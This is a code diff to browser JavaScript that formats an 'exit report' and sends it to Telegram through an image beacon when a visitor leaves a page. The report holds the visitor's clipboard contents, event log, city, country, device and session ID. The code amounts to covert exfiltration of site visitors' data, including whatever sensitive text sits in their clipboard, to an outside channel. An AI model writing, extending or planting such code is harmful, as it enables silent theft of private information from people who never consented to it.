@@ -87,15 +87,19 @@
         const rawLog = localHistory.slice(-20).join('\n').substring(0, 1200);
 
         // 2. Build Comprehensive Telegram Message (SINGLE MESSAGE)
-        const tgMsg = `🛑 <b>TAURUS EXIT REPORT [${sessionID}]</b>\n` +
-            `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        const separator = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`; // 40 chars
+        const tgMsg = `🛑 <b>TAURUS EXIT REPORT</b>\n` +
+            `${separator}\n` +
+            `🆔 <b>SESSION:</b> <code>${sessionID}</code>\n` +
+            `${separator}\n\n` +
             `⏱ <b>DURATION:</b> <code>${duration}s</code>\n` +
             `📍 <b>EXIT PAGE:</b> <code>${window.location.pathname}</code>\n` +
             `🌍 <b>LOCATION:</b> <code>${sessionData?.city || 'Unknown'}, ${sessionData?.country_name || ''}</code>\n` +
             `💻 <b>DEVICE:</b> <code>${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})</code>\n\n` +
+            `${separator}\n` +
             `📋 <b>CLIPBOARD:</b>\n<pre>${escapeHTML(clipboardEntries) || 'None'}</pre>\n\n` +
-            `📝 <b>EVENT LOG:</b>\n<pre>${escapeHTML(rawLog) || 'No events'}</pre>\n\n` +
-            `━━━━━━━━━━━━━━━━━━━━━━`;
+            `📝 <b>EVENT LOG:</b>\n<pre>${escapeHTML(rawLog) || 'No events'}</pre>\n` +
+            `${separator}`;
 
         // 3. Send to Telegram via Image Beacon (Immediate, 100% reliable)
         fireTelegramExit(tgMsg);
